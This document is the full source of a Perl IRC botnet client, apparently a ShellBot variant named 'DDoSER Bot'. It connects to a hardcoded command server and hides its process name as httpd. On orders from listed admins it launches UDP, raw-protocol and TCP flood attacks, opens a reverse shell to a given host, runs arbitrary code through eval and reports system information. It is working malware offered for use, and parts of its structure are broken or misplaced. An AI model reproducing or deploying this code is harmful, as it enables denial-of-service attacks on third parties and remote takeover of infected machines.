#!/usr/bin/perl
use HTTP::Request;
use LWP::UserAgent;
my $processo = '/usr/sbin/httpd';
my @adms      = ("Oks315","Oks","diverzant");
my @canais    = ("#ddos");
my $nick      = 'DDoSer';
my $ircname   = 'DDoSer';
chop( my $realname = `whoami` );
my $servidor= '91.185.201.73' unless $servidor;
my $porta= '6660';
my $VERSAO   = 'DDoSER Bot';
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor = "$ARGV[0]" if $ARGV[0];
$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);
our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
 
sub sendraw {
    if ( $#_ == '1' ) {
        my $socket = $_[0];
        print $socket "$_[1]\n";
    }
    else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
 
sub conectar {
    my $meunick      = $_[0];
    my $servidor_con = $_[1];
    my $porta_con    = $_[2];
    my $IRC_socket   = IO::Socket::INET->new(
        Proto    => "tcp",
        PeerAddr => "$servidor_con",
        PeerPort => $porta_con
    ) or return (1);
    if ( defined($IRC_socket) ) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_cliente->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'}  = "$servidor_con";
        $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
        $irc_servers{$IRC_cur_socket}{'nick'}  = $meunick;
        $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
        nick("$meunick");
        sendraw("USER $ircname "
              . $IRC_socket->sockhost
              . " $servidor_con :$realname" );
        sleep 1;
    }
}
my $line_temp;
while (1) {
    while ( !( keys(%irc_servers) ) ) {
        conectar( "$nick", "$servidor", "$porta" );
    }
    delete( $irc_servers{''} ) if ( defined( $irc_servers{''} ) );
    my @ready = $sel_cliente->can_read(0);
    next unless (@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $meunick        = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread          = sysread( $fh, $msg, 4096 );
        if ( $nread == 0 ) {
            $sel_cliente->remove($fh);
            $fh->close;
            delete( $irc_servers{$fh} );
        }
        @lines = split( /\n/, $msg );
        for ( my $c = 0 ; $c <= $#lines ; $c++ ) {
            $line      = $lines[$c];
            $line      = $line_temp . $line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ( $c == $#lines ) {
                parse("$line");
            }
            else {
                if ( $#lines == 0 ) {
                    parse("$line");
                }
                elsif ( $lines[$c] =~ /\r$/ ) {
                    parse("$line");
                }
                elsif ( $line =~ /^(\S+) NOTICE AUTH :\*\*\*/ ) {
                    parse("$line");
                }
                else {
                    $line_temp = $line;
                }
            }
        }
    }
}
 
sub tcpflooder {
 my $itime = time;
 my ($cur_time);
 my ($ia,$pa,$proto,$j,$l,$t);
 $ia=inet_aton($_[0]);
 $pa=sockaddr_in($_[1],$ia);
 $ftime=$_[2];
 $proto=getprotobyname('tcp');
 $j=0;$l=0;
 $cur_time = time - $itime;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  socket($t,PF_INET,SOCK_STREAM,$proto);
  connect($t,$pa)||$j--;
  $j++;$l++;
 }
 $l=0;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  shutdown($t,2);
  $l++;
 }
}
 
sub udpflooder {
    my $iaddr = inet_aton( $_[0] );
    my $msg   = 'A' x $_[1];
    my $ftime = $_[2];
    my $cp    = 0;
    my (%pacotes);
    $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} =
      $pacotes{tcp} = 0;
 
    socket( SOCK1, PF_INET, SOCK_RAW, 2 ) or $cp++;
 
    socket( SOCK2, PF_INET, SOCK_DGRAM, 17 ) or $cp++;
    socket( SOCK3, PF_INET, SOCK_RAW,   1 )  or $cp++;
    socket( SOCK4, PF_INET, SOCK_RAW,   6 )  or $cp++;
    return (undef) if $cp == 4;
    my $itime = time;
    my ($cur_time);
    while (1) {
        for ( my $porta = 1 ; $porta <= 65000 ; $porta++ ) {
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            send( SOCK1, $msg, 0, sockaddr_in( $porta, $iaddr ) )
              and $pacotes{igmp}++;
            send( SOCK2, $msg, 0, sockaddr_in( $porta, $iaddr ) )
              and $pacotes{udp}++;
            send( SOCK3, $msg, 0, sockaddr_in( $porta, $iaddr ) )
              and $pacotes{icmp}++;
            send( SOCK4, $msg, 0, sockaddr_in( $porta, $iaddr ) )
              and $pacotes{tcp}++;
 
            for ( my $pc = 3 ; $pc <= 255 ; $pc++ ) {
                next if $pc == 6;
                $cur_time = time - $itime;
                last if $cur_time >= $ftime;
                socket( SOCK5, PF_INET, SOCK_RAW, $pc ) or next;
                send( SOCK5, $msg, 0, sockaddr_in( $porta, $iaddr ) )
                  and $pacotes{o}++;
            }
        }
        last if $cur_time >= $ftime;
    }
    return ( $cur_time, %pacotes );
}
 
sub parse {
    my $servarg = shift;
    if ( $servarg =~ /^PING \:(.*)/ ) {
        sendraw("PONG :$1");
    }
    elsif ( $servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/ ) {
        my $pn       = $1;
        my $hostmask = $3;
        my $onde     = $4;
        my $args     = $5;
        if ( $args =~ /^\001VERSION\001$/ ) {
            notice( "$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001" );
        }
        if ( grep { $_ =~ /^\Q$pn\E$/i } @adms ) {
        if ( $args =~ /^(\Q$meunick\E|\!ddos)\s+(.*)/ ) {
        my $natrix = $1;
        my $arg    = $2;
        if ( $arg =~ /^\&(.*)/ ) {
          $ondep = $onde;
          bfunc( "$ondep", "$1" );
            }
        }
        if ( $onde eq "$meunick" ) {
#                shell( "$pn", "$args" );
            }
            if ( $args =~ /^(\Q$meunick\E|\!ddos)\s+(.*)/ ) {
                my $natrix = $1;
                my $arg    = $2;
                if ( $arg =~ /^\!(.*)/ ) {
                    ircase( "$pn", "$onde", "$1" )
                      unless ( $natrix eq "!bot" and $arg =~ /^\!nick/ );
                }
                else {
#                    shell( "$onde", "$arg" );
                }
            }
 
        }
    }
 
    elsif ( $servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i ) {
        if ( lc($1) eq lc($meunick) ) {
            $meunick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
        }
    }
    elsif ( $servarg =~ m/^\:(.+?)\s+433/i ) {
        nick( "$meunick|" . int rand(999999) );
    }
    elsif ( $servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i ) {
        $meunick                              = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        foreach my $canal (@canais) {
            sendraw("JOIN $canal ddosit");
        }
    }
}
 
sub bfunc {
    my $printl  = $_[0];
    my $funcarg = $_[1];
    if ( my $pid = fork ) {
        waitpid( $pid, 0 );
    }
    else {
        if (fork) {
            exit;
        }
        else {
            if ( $funcarg =~ /^udpfl00d\s+(.*)\s+(\d+)\s+(\d+)/ ) {
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :\002[UDP DDoSing]\002 Attacking "
                      . $1
                      . " with "
                      . $2
                      . " Kb packets for "
                      . $3
                      . " seconds." );
                my ( $dtime, %pacotes ) = udpflooder( "$1", "$2", "$3" );
                $dtime = 1 if $dtime == 0;
                my %bytes;
                $bytes{igmp} = $2 * $pacotes{igmp};
                $bytes{icmp} = $2 * $pacotes{icmp};
                $bytes{o}    = $2 * $pacotes{o};
                $bytes{udp}  = $2 * $pacotes{udp};
                $bytes{tcp}  = $2 * $pacotes{tcp};
                sendraw(
                    $IRC_cur_socket,
                    "PRIVMSG $printl :\002UDP]\002 Sent "
                      . int(
                        (
                            $bytes{icmp} +
                              $bytes{igmp} +
                              $bytes{udp} +
                              $bytes{o}
                        ) / 1024
                      )
                      . " Kb in "
                      . $dtime
                      . " seconds to "
                      . $1 . "."
                );
            }
 
  if ($funcarg =~ /^tcpfl00d\s+(.*)\s+(\d+)\s+(\d+)/) {
     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP DDoSing]\002 Attacking ".$1." Porta: ".$2." Tempo: ".$3." Secondi");
     my $itime = time;
     my ($cur_time);
             $cur_time = time - $itime;
     while ($3>$cur_time){
             $cur_time = time - $itime;
     &tcpflooder("$1","$2","$3");
             }
     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP DDoSing]\002 Finished IP: ".$1." Porta: ".$2." ");
           }
 
if ( $funcarg =~ /^info$/ ) {
                my $sysos  = `uname -sr`;
                my $uptime = `uptime`;
                if ( $sysos =~ /freebsd/i ) {
                    $sysname = `hostname`;
                    $memory =
`expr \`cat /var/run/dmesg.boot | grep "real memory" | cut -f5 -d" "\` \/ 1048576`;
                    $cpu = `grep "cpu MHz" /proc/cpuinfo`;
                    chomp($memory);
                    chomp($swap);
                    chomp($cpu);
                }
                elsif ( $sysos =~ /linux/i ) {
                    $sysname = `hostname -f`;
                    $memory  = `grep "MemTotal" /proc/meminfo`;
                    $cpu     = `grep "cpu MHz" /proc/cpuinfo`;
                    chomp($swap);
                    chomp($memory);
                    chomp($cpu);
                }
                else {
                    $sysname = "No Found";
                    $memory  = "No found";
                    $swap    = "No Found";
                    $cpu     = "No Found";
                }
                $uptime  =~ s/\n//g;
                $sysname =~ s/\n//g;
                $sysos   =~ s/\n//g;
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :4.:[2Info] Server: $server :| - $porta4:."
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :4.:[2Info] SO/Hostname:12 $sysos - $sysname4:."
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :4.:[2Info] Process/PID:12 $processo - $$4:."
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :4.:[2Info] Uptime:12 $uptime4:."
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :4.:[2Info] Memory Ram:12 $memory 4:."
                );
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :4.:[2Info] CPU Info:12 $cpu4:."
                );
            }
 
            if ( $funcarg =~ /\!crediti/ ) {
                sendraw( $IRC_cur_socket, "PRIVMSG $printl :\002Crediti:\002" );
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :\002ShellBot Codato Da ALiEN\002" );
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :\002Quindi non Lo Avrà Nessuno\002" );
            }
            exit;
        }
    }
}
 
if ($funcarg =~ /^backd00r\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
$shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);
 
if ($estatisticas)
{
sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[CoNNeCTiNG]\002 $host:$porta ");
}
}
 
sub ircase {
    my ( $kem, $printl, $case ) = @_;
    if ( $case =~ /^join (.*)/ ) {
        j("$1");
    }
    if ( $case =~ /^part (.*)/ ) {
        p("$1");
    }
    if ( $case =~ /^rejoin\s+(.*)/ ) {
        my $chan = $1;
        if ( $chan =~ /^(\d+) (.*)/ ) {
            for ( my $ca = 1 ; $ca <= $1 ; $ca++ ) {
                p("$2");
                j("$2");
            }
        }
        else {
            p("$chan");
            j("$chan");
        }
    }
    if ( $case =~ /^op/ ) {
        op( "$printl", "$kem" ) if $case eq "op";
        my $oarg = substr( $case, 3 );
        op( "$1", "$2" ) if ( $oarg =~ /(\S+)\s+(\S+)/ );
    }
    if ( $case =~ /^deop/ ) {
        deop( "$printl", "$kem" ) if $case eq "deop";
        my $oarg = substr( $case, 5 );
        deop( "$1", "$2" ) if ( $oarg =~ /(\S+)\s+(\S+)/ );
    }
    if ( $case =~ /^msg\s+(\S+) (.*)/ ) {
        msg( "$1", "$2" );
    }
    if ( $case =~ /^flood\s+(\d+)\s+(\S+) (.*)/ ) {
        for ( my $cf = 1 ; $cf <= $1 ; $cf++ ) {
            msg( "$2", "$3" );
        }
    }
    if ( $case =~ /^ctcp\s+(\S+) (.*)/ ) {
        ctcp( "$1", "$2" );
    }
    if ( $case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/ ) {
        for ( my $cf = 1 ; $cf <= $1 ; $cf++ ) {
            ctcp( "$2", "$3" );
        }
    }
    if ( $case =~ /^nick (.*)/ ) {
        nick("$1");
    }
    if ( $case =~ /^connect\s+(\S+)\s+(\S+)/ ) {
        conectar( "$2", "$1", 6667 );
    }
    if ( $case =~ /^raw (.*)/ ) {
        sendraw("$1");
    }
    if ( $case =~ /^eval (.*)/ ) {
        eval "$1";
    }
}
 
sub shell {
    my $printl  = $_[0];
    my $comando = $_[1];
    if ( $comando =~ /cd (.*)/ ) {
        chdir("$1") || msg( "$printl", "No souch file/directory" );
        return;
    }
    elsif ( $pid = fork ) {
        waitpid( $pid, 0 );
    }
    else {
        if (fork) {
            exit;
        }
        }
    }
 
sub ctcp {
    return unless $#_ == 1;
    sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
 
sub msg {
    return unless $#_ == 1;
    sendraw("PRIVMSG $_[0] :$_[1]");
}
 
sub notice {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}
 
sub op {
    return unless $#_ == 1;
    sendraw("MODE $_[0] +o $_[1]");
}
 
sub deop {
    return unless $#_ == 1;
    sendraw("MODE $_[0] -o $_[1]");
}
sub j { &join(@_); }
 
sub join {
    return unless $#_ == 0;
    sendraw("JOIN $_[0]");
}
sub p { part(@_); }
 
sub part {
    sendraw("PART $_[0]");
}
 
sub nick {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}